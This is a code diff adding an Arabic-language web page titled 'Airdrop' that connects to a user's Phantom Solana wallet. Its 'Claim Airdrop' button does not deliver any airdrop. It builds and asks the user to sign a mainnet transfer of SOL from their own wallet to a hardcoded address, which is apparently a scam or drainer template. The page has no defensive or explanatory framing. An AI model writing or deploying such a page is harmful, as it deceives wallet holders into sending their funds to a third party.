@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airdrop</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+            color: green;
+        }
+
+        #error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>ربط محفظة Phantom وإجراء المعاملة</h1>
+
+    <button id="connectButton">اتصل بمحفظة Phantom</button>
+    <button id="claimButton" style="display:none;">Claim Airdrop</button>
+
+    <div id="status"></div>
+    <div id="error"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/dist/web3.min.js"></script>
+    <script>
+        let provider;
+        let walletAddress;
+
+        // وظيفة لربط المحفظة
+        async function connectWallet() {
+            if ("solana" in window) {
+                provider = window.solana;
+
+                if (provider.isPhantom) {
+                    try {
+                        // طلب الوصول إلى المحفظة
+                        const response = await provider.connect();
+                        walletAddress = response.publicKey.toString();
+                        document.getElementById("status").innerText = `تم ربط المحفظة بنجاح: ${walletAddress}`;
+                        document.getElementById("claimButton").style.display = "inline-block"; // إظهار زر claim
+                        document.getElementById("error").innerText = ""; // مسح الأخطاء السابقة
+                    } catch (err) {
+                        console.error("خطأ في ربط المحفظة:", err);
+                        document.getElementById("error").innerText = "فشل ربط المحفظة. يرجى المحاولة مرة أخرى.";
+                    }
+                } else {
+                    document.getElementById("error").innerText = "محفظة Phantom غير مثبتة على متصفحك.";
+                }
+            } else {
+                document.getElementById("error").innerText = "لم يتم العثور على محفظة Solana.";
+            }
+        }
+
+        // وظيفة لتوقيع المعاملة
+        async function claimAirdrop() {
+            if (!provider || !walletAddress) {
+                alert("يرجى ربط المحفظة أولاً.");
+                return;
+            }
+
+            try {
+                // الاتصال بالشبكة الرئيسية
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+                const sender = new solanaWeb3.PublicKey(walletAddress);
+                const receiver = new solanaWeb3.PublicKey("BaGjPnLpffsWjLWhA2xoDTEBLJUCiioS5JSJTpBP9S5w");
+
+                // إنشاء معاملة لتحويل 0.0001 SOL
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: sender,
+                        toPubkey: receiver,
+                        lamports: 0.0001 * solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
+
+                console.log("المعاملة جاهزة للتوقيع:", transaction);
+
+                // توقيع وإرسال المعاملة
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature, "confirmed");
+
+                console.log("التوقيع:", signature);
+                alert("تمت المعاملة بنجاح!");
+            } catch (error) {
+                console.error("فشل المعاملة:", error);
+                alert("فشلت المعاملة، حاول مرة أخرى.");
+            }
+        }
+
+        // ربط الأحداث بالأزرار
+        document.getElementById("connectButton").addEventListener("click", connectWallet);
+        document.getElementById("claimButton").addEventListener("click", claimAirdrop);
+    </script>
+
+</body></html>
